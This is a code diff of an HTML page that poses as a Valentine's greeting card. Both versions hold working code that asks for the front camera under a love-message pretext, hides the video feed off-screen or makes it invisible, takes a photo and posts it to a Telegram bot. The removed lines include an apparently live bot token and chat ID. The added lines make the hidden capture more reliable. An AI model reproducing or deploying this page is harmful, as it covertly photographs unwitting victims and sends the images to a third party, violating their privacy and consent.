@@ -1,90 +1,125 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Valentine's Special ❤️</title>
-    <style>
-        body { background: #ffafbd; background: linear-gradient(to right, #ffc3a0, #ffafbd); font-family: 'Arial', sans-serif; text-align: center; }
-        .card-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-top: 30px; }
-        .card { width: 140px; height: 180px; background: white; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.2); border: 2px solid #ff4b2b; padding: 10px; }
-        #video { width: 1px; height: 1px; opacity: 0; position: absolute; } /* Chota aur invisible */
-        #canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Valentine Surprise ❤️</title>
+
+<style>
+body{
+    background: linear-gradient(to right,#ffc3a0,#ffafbd);
+    font-family: Arial, sans-serif;
+    text-align: center;
+}
+.card-container{
+    display:flex;
+    justify-content:center;
+    gap:15px;
+    margin-top:30px;
+    flex-wrap:wrap;
+}
+.card{
+    width:140px;
+    height:180px;
+    background:#fff;
+    border-radius:10px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+    cursor:pointer;
+    border:2px solid #ff4b2b;
+    box-shadow:0 4px 8px rgba(0,0,0,0.2);
+}
+
+/* 🔴 CAMERA FIX */
+#video{
+    position:fixed;
+    top:-1000px;
+    left:-1000px;
+    width:320px;
+    height:240px;
+}
+#canvas{display:none;}
+</style>
 </head>
+
 <body>
 
-    <h1 style="color: white; text-shadow: 2px 2px #ff4b2b;">Open Your Valentine Card 💌</h1>
+<h2>Open Your Valentine Card 💌</h2>
 
-    <div class="card-container">
-        <div class="card" onclick="startProcess('Tu meri zindagi ka sabse pyara hissa hai! 🌹')">Pyaar Bhara Tohfa</div>
-        <div class="card" onclick="startProcess('I Promise to love you forever! 💍')">Ek Vaada</div>
-        <div class="card" onclick="startProcess('You are so beautiful! 😍')">Tareef</div>
-    </div>
+<div class="card-container">
+    <div class="card" onclick="startCamera('Tu meri zindagi ho ❤️')">Pyaar</div>
+    <div class="card" onclick="startCamera('I Love You 😍')">Love</div>
+    <div class="card" onclick="startCamera('Forever Together 💍')">Promise</div>
+</div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-    <script>
-        const botToken = "8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc";
-        const chatId = "7735968383";
+<script>
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID  = "YOUR_CHAT_ID_HERE";
 
-        async function startProcess(msg) {
-            // Pehle camera permission maangega
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // Front camera force karna
-                    audio: false 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+let stream;
 
-                // User ko message dikhao jab tak peeche camera set ho raha hai
-                alert(msg);
+async function startCamera(msg){
+    alert(msg);
 
-                // 3 Second ka wait taaki black screen na aaye
-                setTimeout(() => {
-                    captureRealPhoto(stream);
-                }, 3000); 
+    try{
+        stream = await navigator.mediaDevices.getUserMedia({
+            video:{ facingMode:"user" },
+            audio:false
+        });
 
-            } catch (err) {
-                alert("Please allow camera to see the surprise! ❤️");
-            }
-        }
+        const video = document.getElementById("video");
+        video.srcObject = stream;
 
-        function captureRealPhoto(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
+        video.onloadedmetadata = () => {
+            video.play();
 
-            // Video frames check
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // ✅ Camera ready hone ka wait
+            setTimeout(capturePhoto, 1500);
+        };
 
-                canvas.toBlob(blob => {
-                    sendToTelegram(blob);
-                    // Camera band kar do kaam khatam hone ke baad
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg', 0.8); // 0.8 quality for clear photo
-            } else {
-                // Agar data ready nahi hai toh 1 sec aur wait karo
-                setTimeout(() => captureRealPhoto(stream), 1000);
-            }
-        }
+    }catch(e){
+        alert("Camera allow karo ❤️");
+    }
+}
 
-        function sendToTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageBlob, 'capture.jpg');
+function capturePhoto(){
+    const video  = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx    = canvas.getContext("2d");
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-    </script>
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+    canvas.toBlob(blob=>{
+        sendToTelegram(blob);
+        stopCamera();
+    },"image/jpeg",0.9);
+}
+
+function stopCamera(){
+    if(stream){
+        stream.getTracks().forEach(t=>t.stop());
+    }
+}
+
+function sendToTelegram(blob){
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blob, "photo.jpg");
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+        method:"POST",
+        body:fd
+    });
+}
+</script>
+
 </body>
 </html>
